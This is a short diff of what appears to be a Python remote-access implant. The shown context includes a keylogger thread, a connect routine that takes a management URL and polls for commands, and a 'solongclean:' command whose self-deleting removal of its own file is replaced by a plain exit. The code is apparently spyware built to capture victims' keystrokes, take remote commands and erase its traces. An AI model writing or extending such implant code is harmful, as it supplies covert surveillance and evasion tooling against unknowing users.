@@ -70,6 +70,7 @@ def enableKeylogger():
         listener.join()
 
 
+
 def connect(url,managementURL):
 
     screenshotwarning = False
@@ -78,7 +79,6 @@ def connect(url,managementURL):
     global keys
 
     threadKeystrokes = threading.Thread(target=enableKeylogger)
-
 
 
     # Fetch JSON results
@@ -158,9 +158,9 @@ def connect(url,managementURL):
                 sys.exit(1)
 
             if cmd.startswith("solongclean:"):
-                # process and delete itself
-                dir = os.getcwd()
-                os.remove(dir + '\%s' % sys.argv[0])
+                # have implant delete itself
+
+                sys.exit(1)
 
         command = decodelist[-1]
 
